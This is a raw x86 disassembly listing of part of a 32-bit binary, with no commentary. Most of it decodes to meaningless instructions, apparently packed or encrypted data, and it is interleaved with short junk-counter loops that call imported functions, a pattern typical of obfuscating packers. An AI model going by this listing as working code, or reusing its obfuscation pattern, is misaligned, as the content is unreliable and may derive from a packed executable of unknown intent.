  40e5e4:	les    edx,FWORD PTR [edi+ebp*4-0x4617ffc9]
  40e5eb:	mov    ds:0x86d6cc7,eax
  40e5f0:	xor    al,0x4e
  40e5f2:	adc    ebx,DWORD PTR [ecx-0x61c7fc84]
  40e5f8:	mov    eax,0x8026765e
  40e5fd:	(bad)  
  40e5fe:	ins    BYTE PTR es:[edi],dx
  40e5ff:	adc    BYTE PTR [eax+0x35],bl
  40e602:	xchg   esp,eax
  40e603:	into   
  40e604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e605:	pushf  
  40e606:	mov    es:0xcc393310,eax
  40e60c:	and    eax,0xabee839a
  40e611:	outs   dx,DWORD PTR ds:[esi]
  40e612:	jmp    DWORD PTR [ecx-0x32]
  40e615:	mov    BYTE PTR [ebp+0x77db6b89],ch
  40e61b:	mov    edx,0x3cb4bc3b
  40e620:	cmc    
  40e621:	xor    ch,BYTE PTR [esi]
  40e623:	pop    edx
  40e624:	pushf  
  40e625:	sub    edx,edi
  40e627:	and    ebx,DWORD PTR [edx-0x1b]
  40e62a:	push   0xffffffc1
  40e62c:	ret    0xd220
  40e62f:	into   
  40e630:	dec    eax
  40e631:	jge    0x40e5c3
  40e633:	fsubr  DWORD PTR [eax-0x154562ce]
  40e639:	xchg   ecx,eax
  40e63a:	in     al,0xc6
  40e63c:	mov    ecx,0x88548810
  40e641:	mov    ds:0x4033e785,eax
  40e646:	cmp    al,0x50
  40e648:	cbw    
  40e64a:	int    0x7c
  40e64c:	mov    ds:0x5e53f163,eax
  40e651:	(bad)  
  40e652:	push   edx
  40e653:	retf   
  40e654:	mov    ebx,DWORD PTR [edi-0x49131053]
  40e65a:	pop    ecx
  40e65b:	pop    ecx
  40e65c:	pop    esi
  40e65d:	data16 mov al,ds:0xc011a2fb
  40e663:	cmp    ecx,DWORD PTR [esi*8-0x21124c8f]
  40e66a:	arpl   WORD PTR [eax],bp
  40e66c:	dec    esp
  40e66d:	push   edi
  40e66e:	in     eax,dx
  40e66f:	cmp    esi,DWORD PTR [di+0x3767]
  40e674:	dec    eax
  40e675:	ret    
  40e676:	(bad)
  40e679:	iret   
  40e67a:	mov    eax,0x475a6740
  40e67f:	and    DWORD PTR ds:0xf2f19735,0x888064e5
  40e689:	loope  0x40e652
  40e68b:	jae    0x40e61c
  40e68d:	sub    DWORD PTR [eax],edi
  40e68f:	fimul  DWORD PTR [ecx]
  40e691:	dec    eax
  40e692:	mov    ah,0x7c
  40e694:	std    
  40e695:	ror    DWORD PTR [ebx-0x5548b68d],1
  40e69b:	mov    ebp,0x1cfcd8ac
  40e6a0:	dec    edx
  40e6a1:	cmp    BYTE PTR [esi-0x54],dh
  40e6a4:	inc    edx
  40e6a5:	add    eax,0x7400cedc
  40e6aa:	jmp    0x8e77f63d
  40e6af:	mov    ch,0xaa
  40e6b1:	adc    edi,edi
  40e6b3:	fxam   
  40e6b5:	push   es
  40e6b6:	fcom   st(2)
  40e6b8:	jl     0x40e6a6
  40e6ba:	add    BYTE PTR [ecx+0x4e],al
  40e6bd:	out    0xd8,eax
  40e6bf:	xlat   BYTE PTR ds:[ebx]
  40e6c0:	dec    edi
  40e6c1:	pop    eax
  40e6c2:	pop    edi
  40e6c3:	dec    esp
  40e6c4:	cmp    edx,DWORD PTR [edx]
  40e6c6:	sbb    al,0xcb
  40e6c8:	out    0x5a,eax
  40e6ca:	test   eax,0x95022fe0
  40e6cf:	popf   
  40e6d0:	pop    ecx
  40e6d1:	cmp    ah,BYTE PTR [esi]
  40e6d3:	push   ecx
  40e6d4:	inc    ebx
  40e6d5:	aad    0x56
  40e6d7:	int3   
  40e6d8:	inc    edx
  40e6d9:	xchg   BYTE PTR ds:0x168d8f6d,bl
  40e6df:	nop
  40e6e0:	outs   dx,DWORD PTR ds:[esi]
  40e6e1:	cmp    BYTE PTR [edi],al
  40e6e3:	inc    esp
  40e6e4:	or     al,0xac
  40e6e6:	dec    DWORD PTR [ecx+0x3a]
  40e6e9:	sub    edi,DWORD PTR [ebp+0x7e]
  40e6ec:	xchg   ecx,eax
  40e6ed:	(bad)  
  40e6ee:	and    BYTE PTR [edi-0x72e5f01c],cl
  40e6f4:	clc    
  40e6f5:	lods   al,BYTE PTR ds:[esi]
  40e6f6:	pop    esp
  40e6f7:	push   es
  40e6f8:	ins    DWORD PTR es:[edi],dx
  40e6f9:	push   eax
  40e6fa:	jae    0x40e775
  40e6fc:	sub    ebp,DWORD PTR [edi-0x3cfc39cd]
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	and    BYTE PTR [edx-0x39],dh
  40e735:	inc    edi
  40e736:	aas    
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	iret   
  40e73f:	idiv   DWORD PTR [ecx]
  40e741:	or     ch,BYTE PTR [esi]
  40e743:	mov    ecx,ecx
  40e745:	repz cmp BYTE PTR [ebx+ecx*8+0x32],cl
  40e74a:	push   edx
  40e74b:	out    dx,al
  40e74c:	test   DWORD PTR [eax-0x16],edi
  40e74f:	ins    DWORD PTR es:[edi],dx
  40e750:	cmp    dl,al
  40e752:	pop    eax
  40e753:	mov    al,ds:0x2205d9f2
  40e758:	jmp    0x900443bc
  40e75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e75e:	inc    esi
  40e75f:	jb     0x40e720
  40e761:	repz mov cl,0x3d
  40e764:	arpl   WORD PTR [ebx-0x51],ax
  40e767:	imul   esp,DWORD PTR [esi+esi*8+0x69cbd3c8],0xbb8ceb65
  40e772:	xchg   esi,eax
  40e773:	stc    
  40e774:	sub    al,0x4d
  40e776:	mov    ebx,0x4c478a3f
  40e77b:	adc    eax,0x2858b2d7
  40e780:	imul   esi,DWORD PTR [ebp-0x38eb0371],0x7918578b
  40e78a:	mov    bh,0x24
  40e78c:	pop    eax
  40e78d:	jp     0x40e7cd
  40e78f:	jnp    0x40e787
  40e791:	out    dx,al
  40e792:	push   edi
  40e793:	fwait
  40e794:	or     DWORD PTR [esi+ebp*8+0x37],0xd594d63c
  40e79c:	aas    
  40e79d:	sbb    BYTE PTR [ebx-0x696f233a],dh
  40e7a3:	sahf   
  40e7a4:	sbb    eax,0x3c376d1a
  40e7a9:	jno    0x40e731
  40e7ab:	push   ecx
  40e7ac:	adc    al,0x9f
  40e7ae:	xor    eax,esp
  40e7b0:	stos   DWORD PTR es:[edi],eax
  40e7b1:	sub    cl,BYTE PTR [ecx+0x7e356e2a]
  40e7b7:	mov    sp,0xe8cc
  40e7bb:	ficomp DWORD PTR [ebp+0x7c]
  40e7be:	jle    0x40e7b5
  40e7c0:	ret    0x8f01
  40e7c3:	pop    ds
  40e7c4:	das    
  40e7c5:	hlt    
  40e7c6:	call   0x1a2ccce2
  40e7cb:	pop    esp
  40e7cc:	adc    bh,al
  40e7ce:	jb     0x40e76f
  40e7d0:	shl    bl,cl
  40e7d2:	out    dx,eax
  40e7d3:	out    dx,eax
  40e7d4:	dec    edx
  40e7d5:	inc    ebp
  40e7d6:	loope  0x40e832
  40e7d8:	xchg   ebx,eax
  40e7d9:	imul   esi,DWORD PTR [esi+0x694ce426],0xfffffff9
  40e7e0:	xlat   BYTE PTR ds:[ebx]
  40e7e1:	xor    al,BYTE PTR [esi]
  40e7e3:	xchg   DWORD PTR [ecx],edx
  40e7e5:	inc    edi
  40e7e6:	xor    al,0xb9
  40e7e9:	pop    ds
  40e7ea:	dec    edi
  40e7eb:	inc    edi
  40e7ec:	jg     0x40e76f
  40e7ee:	sti    
  40e7ef:	hlt    
  40e7f0:	test   eax,0x7dfecc41
  40e7f5:	(bad)  
  40e7f6:	sbb    DWORD PTR [edi+eiz*4],esp
  40e7f9:	dec    eax
  40e7fa:	and    BYTE PTR [edx+ecx*1],bh
  40e7fd:	cmp    al,0xd
  40e7ff:	and    DWORD PTR [esi+ebp*2-0x4d],0xd
  40e804:	jecxz  0x40e864
  40e806:	or     DWORD PTR [eax-0x186bc5ac],esi
  40e80c:	lods   al,BYTE PTR ds:[esi]
  40e80d:	mov    dh,0x32
  40e80f:	outs   dx,DWORD PTR ds:[esi]
  40e810:	add    cl,bl
  40e812:	inc    edx
  40e813:	hlt    
  40e814:	addr16 jle 0x40e815
  40e817:	shr    BYTE PTR [ecx-0x47e49a80],1
  40e81d:	push   ss
  40e81e:	xor    BYTE PTR [esp+edx*8-0x3a],0x9b
  40e823:	jno    0x40e80a
  40e825:	fmul   QWORD PTR [ebp-0x1085b2e4]
  40e82b:	cmp    cl,BYTE PTR [edx+0x769d5c24]
  40e831:	and    eax,DWORD PTR [ecx]
  40e833:	rol    esp,1
  40e835:	xor    ah,BYTE PTR [edi]
  40e837:	jecxz  0x40e8aa
  40e839:	lds    esi,FWORD PTR [eax]
  40e83b:	push   0x6c
  40e83d:	stc    
  40e83e:	pop    ebx
  40e83f:	and    dh,BYTE PTR [ebp+0xb543b22]
  40e845:	add    eax,0x8a970617
  40e84a:	xchg   ecx,eax
  40e84b:	(bad)  
  40e84c:	in     eax,dx
  40e84d:	aas    
  40e84e:	pusha  
  40e84f:	hlt    
  40e850:	push   es
  40e851:	dec    sp
  40e853:	cdq    
  40e854:	std    
  40e855:	rol    dl,0x70
  40e858:	retf   0x89bf
  40e85b:	aad    0xc5
  40e85d:	sbb    al,0xff
  40e85f:	fmul   st(3),st
  40e861:	sbb    eax,0x53e97379
  40e866:	cdq    
  40e867:	inc    edi
  40e868:	shl    BYTE PTR [edi-0x6b],1
  40e86b:	imul   ebp,DWORD PTR [ecx+ebp*1+0x1e9bdc54],0x202f61bf
  40e876:	inc    ebx
  40e877:	das    
  40e878:	in     eax,0xfa
  40e87a:	pop    esi
  40e87b:	mov    ah,0x76
  40e87d:	sub    BYTE PTR [ebx-0x37255cc0],dh
  40e883:	xchg   ebp,eax
  40e884:	mov    ch,0x22
  40e886:	push   eax
  40e887:	ja     0x40e8e2
  40e889:	es xchg ecx,eax
  40e88b:	xchg   ecx,eax
  40e88c:	daa    
  40e88d:	in     eax,dx
  40e88e:	mov    ch,0x5f
  40e890:	and    eax,0x2c5db8f9
  40e895:	push   esp
  40e896:	cmp    ebx,DWORD PTR [edx]
  40e898:	xor    eax,0x9d1ff0d8
  40e89d:	sbb    al,0x8d
  40e89f:	mov    esp,0x936e20b1
  40e8a4:	das    
  40e8a5:	inc    ebx
  40e8a6:	lods   al,BYTE PTR ds:[esi]
  40e8a7:	hlt    
  40e8a8:	jnp    0x40e82b
  40e8aa:	or     dh,cl
  40e8ac:	mov    eax,ds:0x4d1f6403
  40e8b1:	mov    esp,0xd8d52ae4
  40e8b6:	(bad)  
  40e8b7:	jmp    0x96a9d593
  40e8bc:	fcmovnbe st,st(1)
  40e8bf:	sar    esi,1
  40e8c1:	arpl   WORD PTR [edx+0x7bd03e84],dx
  40e8c7:	jg     0x40e90a
  40e8c9:	push   esi
  40e8ca:	fnstcw WORD PTR [ecx+0x6dcc5863]
  40e8d0:	pop    edi
  40e8d1:	xchg   ebp,eax
  40e8d2:	scas   al,BYTE PTR es:[edi]
  40e8d3:	adc    DWORD PTR [eax+0x74],edi
  40e8d6:	rol    BYTE PTR [eax+0x254629c6],cl
  40e8dc:	ror    BYTE PTR [ebp+0x5d6cea5d],cl
  40e8e2:	int    0x8c
  40e8e4:	ins    BYTE PTR es:[edi],dx
  40e8e5:	ins    BYTE PTR es:[edi],dx
  40e8e6:	cmc    
  40e8e7:	and    bh,cl
  40e8e9:	ss mov dh,0x18
  40e8ec:	mov    ds:0x4bfaa749,al
  40e8f1:	into   
  40e8f2:	push   ss
  40e8f3:	int    0x28
  40e8f5:	mov    cl,0x3f
  40e8f7:	jp     0x40e8b5
  40e8f9:	ret    
  40e8fa:	hlt    
  40e8fb:	je     0x40e932
  40e8fd:	stc    
  40e8fe:	in     al,dx
  40e8ff:	adc    al,0xf9
  40e901:	gs pop ds
  40e903:	sbb    DWORD PTR [ecx+0x71e2cb61],esp
  40e909:	add    al,0xf7
  40e90b:	xchg   ebp,eax
  40e90c:	in     al,dx
  40e90d:	sub    DWORD PTR [edx],edi
  40e90f:	jecxz  0x40e8ac
  40e911:	test   esp,0x1f623680
  40e917:	test   BYTE PTR [ecx+0x6a],bh
  40e91a:	or     eax,0x8a60851f
  40e91f:	lds    edx,FWORD PTR ds:0x177e005c
  40e925:	jl     0x40e978
  40e927:	test   BYTE PTR [eax-0x5d],bl
  40e92a:	stc    
  40e92b:	xchg   esp,eax
  40e92c:	aaa    
  40e92d:	or     dh,BYTE PTR [ebx+0x7b04db2c]
  40e933:	mov    eax,0x727a1d0b
  40e938:	jge    0x40e91e
  40e93a:	push   es
  40e93b:	adc    DWORD PTR [esi+0x6e],esi
  40e93e:	je     0x40e92e
  40e940:	dec    edi
  40e941:	or     DWORD PTR [ecx-0x576754df],esp
  40e947:	cmp    edx,DWORD PTR [edi+eax*2+0x1390a08a]
  40e94e:	push   edi
  40e94f:	(bad)  
  40e950:	call   0xa9ff966
  40e955:	stos   BYTE PTR es:[edi],al
  40e956:	jmp    0x40e91e
  40e958:	pop    ecx
  40e959:	mov    ah,0x5b
  40e95b:	xlat   BYTE PTR ds:[ebx]
  40e95c:	mov    dh,BYTE PTR cs:[eax]
  40e95f:	rcr    DWORD PTR [ebp-0x5597b6d1],1
  40e965:	cs cli 
  40e967:	mov    bh,0x76
  40e969:	sar    DWORD PTR [eax+edi*1],0x3c
  40e96d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e96f:	shl    BYTE PTR [edx],0x15
  40e972:	fucom  st(3)
  40e974:	clc    
  40e975:	push   0x8bff7b02
  40e97a:	inc    ebp
  40e97b:	or     al,0x33
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42aa51,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42aa51
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42aa51,edx
  40e9c6:	cmp    DWORD PTR ds:0x42aa51,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42aa51,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42aa51
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42aa51,edx
  40e9f6:	cmp    DWORD PTR ds:0x42aa51,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	cwde   
  40ea23:	adc    ecx,DWORD PTR [ebx+0x78b9f42b]
  40ea29:	js     0x40ea10
  40ea2b:	jle    0x40eaa5
  40ea2d:	js     0x40ea11
  40ea2f:	or     DWORD PTR [esp+edi*4+0x26],eax
  40ea33:	xor    ch,ch
  40ea35:	mov    edi,0xef0f1c13
  40ea3a:	fnstsw WORD PTR [eax+0x2a]
  40ea3d:	test   eax,0x4f5b95cb
  40ea42:	ds mov bh,0x11
  40ea45:	xor    bl,BYTE PTR [ecx]
  40ea47:	inc    esi
  40ea48:	jle    0x40e9d6
  40ea4a:	push   ecx
  40ea4b:	sub    ah,ah
  40ea4d:	jmp    0x77aa6b2f
  40ea52:	jge    0x40ea5b
  40ea54:	cmp    ebp,DWORD PTR [ecx]
  40ea56:	out    dx,eax
  40ea57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea58:	stc    
  40ea59:	sahf   
  40ea5a:	or     DWORD PTR [edx+edx*8+0x55],0x42081dae
  40ea62:	or     esp,DWORD PTR [esi]
  40ea64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea65:	pop    esp
  40ea66:	inc    esi
  40ea67:	hlt    
  40ea68:	mov    ah,ah
  40ea6a:	lods   al,BYTE PTR ds:[esi]
  40ea6b:	cld    
  40ea6c:	and    bh,al
  40ea6e:	rcr    DWORD PTR [ecx-0x71586b9a],0x88
  40ea75:	outs   dx,BYTE PTR ds:[esi]
  40ea76:	push   ds
  40ea77:	pusha  
  40ea78:	and    esp,DWORD PTR [edi-0x52b7a45d]
  40ea7e:	(bad)  
  40ea7f:	sub    eax,0x3c4fe3ce
  40ea84:	js     0x40eadf
  40ea86:	push   cs
  40ea87:	pop    ss
  40ea88:	xor    DWORD PTR [edx+0x66],esi
  40ea8b:	arpl   WORD PTR [ecx-0x70],di
  40ea8e:	or     ch,BYTE PTR [ebx]
  40ea90:	sub    DWORD PTR [eax-0x2],ebp
  40ea93:	xlat   BYTE PTR ds:[ebx]
  40ea94:	pop    ebp
  40ea95:	sub    esi,DWORD PTR [eax+0x3301632d]
  40ea9b:	mov    ebx,0x2fce06ab
  40eaa0:	push   0x3e306768
  40eaa5:	sbb    ebx,DWORD PTR [ecx-0x38]
  40eaa8:	mov    bh,0xfd
  40eaaa:	push   edi
  40eaab:	or     bl,cl
  40eaad:	fstp   QWORD PTR [esi]
  40eaaf:	jns    0x40ea80
  40eab1:	xchg   esi,eax
  40eab2:	in     eax,dx
  40eab3:	(bad)
  40eab6:	icebp  
  40eab7:	rcl    DWORD PTR [edi],cl
  40eab9:	sar    DWORD PTR [ebx+eax*2],0x30
  40eabd:	adc    BYTE PTR [ebp-0x74dc7a71],bh
  40eac3:	imul   esp,DWORD PTR [eax+edx*2],0xd6e0b2fd
  40eaca:	(bad)  
  40eacb:	test   DWORD PTR [edi-0x58],eax
  40eace:	js     0x40eb23
  40ead0:	test   eax,0x56ff28f4
  40ead5:	add    BYTE PTR [esi+0x44],dh
  40ead8:	ja     0x40eb03
  40eada:	mov    ebx,0xedfe253c
  40eadf:	std    
  40eae0:	mov    ds:0xb050e48d,al
  40eae5:	icebp  
  40eae6:	xor    edx,DWORD PTR [edx]
  40eae8:	push   eax
  40eae9:	jns    0x40eb45
  40eaeb:	imul   ebx,edi,0x3d
  40eaee:	mov    eax,esi
  40eaf0:	and    DWORD PTR [ebp+0x24d212be],0x6d22a463
  40eafa:	int    0x6a
  40eafc:	retf   0x3397
  40eaff:	int3   
  40eb00:	jnp    0x40eb77
  40eb02:	aaa    
  40eb03:	daa    
  40eb04:	xchg   ebp,eax
  40eb05:	mov    ebp,0xf728e29
  40eb0a:	sahf   
  40eb0b:	jg     0x40eb30
  40eb0d:	xchg   esi,eax
  40eb0e:	push   ebx
  40eb0f:	pop    edi
  40eb10:	or     DWORD PTR [esi],ebx
  40eb12:	ss mov edi,0x4c93d137
  40eb18:	daa    
  40eb19:	xchg   ecx,eax
  40eb1a:	cmp    DWORD PTR [ecx-0x21],esp
  40eb1d:	or     dh,BYTE PTR [ebp-0x6fcbf1aa]
  40eb23:	enter  0xfdd4,0xef
  40eb27:	mov    gs,WORD PTR [edx+0x26]
  40eb2a:	scas   al,BYTE PTR es:[edi]
  40eb2b:	push   ss
  40eb2c:	stos   BYTE PTR es:[edi],al
  40eb2d:	adc    DWORD PTR [esi-0x31],ebp
  40eb30:	mov    al,ds:0x935274ba
  40eb35:	jmp    0x40eb24
  40eb37:	adc    al,0xf9
  40eb39:	out    dx,al
  40eb3a:	xchg   ecx,eax
  40eb3b:	cld    
  40eb3c:	jmp    0xbf7e9492
  40eb41:	mov    WORD PTR [eax+0x482117f1],gs
  40eb47:	sub    eax,0xc5ade8f0
  40eb4c:	inc    ebp
  40eb4d:	pop    edi
  40eb4e:	xor    ah,BYTE PTR [eax]
  40eb50:	pop    eax
  40eb51:	adc    al,0x62
  40eb53:	inc    edx
  40eb54:	xchg   esi,eax
  40eb55:	jo     0x40eb1e
  40eb57:	and    edi,DWORD PTR [edi]
  40eb59:	lods   al,BYTE PTR ds:[esi]
  40eb5a:	repz push ds
  40eb5c:	pop    esi
  40eb5d:	or     edi,esi
  40eb5f:	add    DWORD PTR [ebx+0x169a26d1],esi
  40eb65:	stc    
  40eb66:	sub    eax,0xaa97c364
  40eb6b:	inc    esp
  40eb6c:	(bad)  
  40eb6e:	sub    esp,DWORD PTR [edx]
  40eb70:	jmp    0x40eb05
  40eb72:	shr    ah,0xbb
  40eb75:	adc    ebx,esi
  40eb77:	test   al,0x1c
  40eb79:	jne    0x40eb31
  40eb7b:	cdq    
  40eb7c:	sub    BYTE PTR [esi+0x12],cl
  40eb7f:	mov    ecx,0x67d40967
  40eb84:	repz repz (bad) 
  40eb87:	imul   esi,eax,0xffffffa6
  40eb8a:	fld    TBYTE PTR [ebp+eiz*1-0x45]
  40eb8e:	jae    0xa076a469
  40eb94:	popf   
  40eb95:	daa    
  40eb96:	add    eax,0xbcef3da7
  40eb9b:	xor    eax,0xe2dae2c1
  40eba0:	(bad)  
  40eba1:	js     0x40ebe1
  40eba3:	xchg   BYTE PTR [ebp-0x65],bh
  40eba6:	(bad)  
  40eba7:	stos   DWORD PTR es:[edi],eax
  40eba8:	mov    ds:0x6142ad93,eax
  40ebad:	popf   
  40ebae:	jbe    0x40eb9b
  40ebb0:	mov    ebx,0x90db293f
  40ebb5:	add    DWORD PTR [ebx],0x6f9e9df8
  40ebbb:	repnz fxch st(0)
  40ebbe:	data16 xor ch,al
  40ebc1:	pop    ss
  40ebc2:	je     0x40eb5b
  40ebc4:	push   ss
  40ebc5:	outs   dx,DWORD PTR ds:[esi]
  40ebc6:	mov    al,ds:0xa4789ef4
  40ebcb:	in     al,dx
  40ebcc:	fsubr  DWORD PTR es:[esi]
  40ebcf:	lea    ecx,[edi]
  40ebd1:	mov    edi,DWORD PTR [edi]
  40ebd3:	loope  0x40eb82
  40ebd5:	push   ecx
  40ebd6:	sahf   
  40ebd7:	retf   0xea4d
  40ebda:	les    ebx,FWORD PTR [ecx]
  40ebdc:	lods   al,BYTE PTR ds:[esi]
  40ebdd:	ds retf 
  40ebdf:	retf   0xccb5
  40ebe2:	mov    esi,0x2092f388
  40ebe7:	cwde   
  40ebe8:	push   ebx
  40ebe9:	cmp    ecx,ecx
  40ebeb:	shl    BYTE PTR [ecx],0x77
  40ebee:	out    0x34,eax
  40ebf0:	fs sbb esi,esi
  40ebf3:	mov    dh,0xd4
  40ebf5:	rol    ah,1
  40ebf7:	mov    BYTE PTR [edi+0x5adfdab6],al
  40ebfd:	sub    al,0xc3
  40ebff:	xchg   ebp,eax
  40ec00:	das    
  40ec01:	adc    DWORD PTR cs:[ebx+ebx*4],ebp
  40ec05:	mov    esi,0x563a6ccf
  40ec0a:	pop    ds
  40ec0b:	sti    
  40ec0c:	cli    
  40ec0d:	cdq    
  40ec0e:	or     eax,0xdce9c9f
  40ec13:	das    
  40ec14:	adc    DWORD PTR [ecx+0x1da26709],ecx
  40ec1a:	or     eax,0x12a31b9b
  40ec1f:	adc    bl,bh
  40ec21:	das    
  40ec22:	push   0x72
  40ec24:	icebp  
  40ec25:	pop    ds
  40ec26:	sub    BYTE PTR [edi-0x2d],0xd
  40ec2a:	dec    ebx
  40ec2b:	sub    DWORD PTR [edi-0x3d957d2d],ebp
  40ec31:	or     DWORD PTR [eax],ecx
  40ec33:	cdq    
  40ec34:	bound  ecx,QWORD PTR [ebx-0x2293ed2]
  40ec3a:	(bad)  
  40ec3b:	mov    ds:0x41de6084,eax
  40ec40:	call   0x68ed:0xcbdc157d
  40ec47:	jl     0x40ebed
  40ec49:	jle    0x40ecae
  40ec4b:	pop    edi
  40ec4c:	cmp    DWORD PTR [ebx],esi
  40ec4e:	fs aam 0xcf
  40ec51:	cli    
  40ec52:	cmp    bl,cl
  40ec54:	int3   
  40ec55:	push   ebp
  40ec56:	(bad)  
  40ec57:	int    0x7b
  40ec59:	cld    
  40ec5a:	test   BYTE PTR [edi],bh
  40ec5c:	sbb    esp,DWORD PTR [ecx+edx*1]
  40ec5f:	push   0x2b3f22a8
  40ec64:	cmp    eax,ecx
  40ec66:	lods   al,BYTE PTR ds:[esi]
  40ec67:	notrack call DWORD PTR [ecx]
  40ec6a:	inc    eax
  40ec6b:	aad    0xba
  40ec6d:	push   cs
  40ec6e:	cmp    eax,0xdc275356
  40ec73:	ficom  WORD PTR [edx-0x69c581bf]
  40ec79:	in     eax,dx
  40ec7a:	dec    ebp
  40ec7b:	and    esi,DWORD PTR [ebx-0x232332b8]
  40ec81:	lods   al,BYTE PTR ds:[esi]
  40ec82:	imul   esp,DWORD PTR [ebx+0x11],0xa1c25ed2
  40ec89:	stos   DWORD PTR es:[edi],eax
  40ec8a:	fwait
  40ec8b:	scas   eax,DWORD PTR es:[edi]
  40ec8c:	mov    ds:0x5c6f64ee,al
  40ec91:	xchg   BYTE PTR [esp+ecx*1+0x59df3a5f],ch
  40ec98:	lods   al,BYTE PTR ds:[esi]
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42a9dd
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42aad9,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42aad9,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42aad9,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42aad9,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42aad9
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42aad9,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42aad9
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42aad9,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42aae5,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42aae5
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42aae5,edi
  40ed34:	cmp    DWORD PTR ds:0x42aae5,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42aae5,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42aae5
  40ed66:	inc    edi
  40ed67:	mov    DWORD PTR ds:0x42aae5,edi
  40ed6d:	cmp    DWORD PTR ds:0x42aae5,0x1f
  40ed74:	jb     0x40ed27
  40ed7a:	add    edi,DWORD PTR ds:0x42aa5d
  40ed80:	add    edx,ecx
  40ed82:	mov    edi,DWORD PTR ds:0x42aa51
  40ed88:	xor    DWORD PTR ds:0x42aad5,edi
  40ed8e:	jmp    0x40f016
  40ed93:	retf   0xc5c0
  40ed96:	ror    cl,0xc5
  40ed99:	leave  
  40ed9a:	retf   0x1a17
  40ed9d:	push   edx
  40ed9e:	xchg   edx,eax
  40ed9f:	dec    ecx
  40eda0:	inc    edi
  40eda1:	lock jl 0x40ee05
  40eda4:	mov    edi,0x7ee57878
  40eda9:	js     0x40ee23
  40edab:	out    0xaa,eax
  40edad:	movlps xmm1,QWORD PTR [ebp+0x52b60f22]
  40edb4:	dec    ebx
  40edb5:	push   ecx
  40edb6:	std    
  40edb7:	ins    BYTE PTR es:[edi],dx
  40edb8:	push   ebx
  40edb9:	sub    edi,DWORD PTR [ebp+ebx*4+0x389cf280]
  40edc0:	aaa    
  40edc1:	jns    0x40edfe
  40edc3:	addr16 mov esi,eax
  40edc6:	or     BYTE PTR [eax-0x76d8934c],al
  40edcc:	inc    ebp
  40edcd:	outs   dx,BYTE PTR ds:[esi]
  40edce:	xor    DWORD PTR [edx],ebx
  40edd0:	es sub bl,cl
  40edd3:	push   cs
  40edd4:	into   
  40edd5:	fwait
  40edd6:	iret   
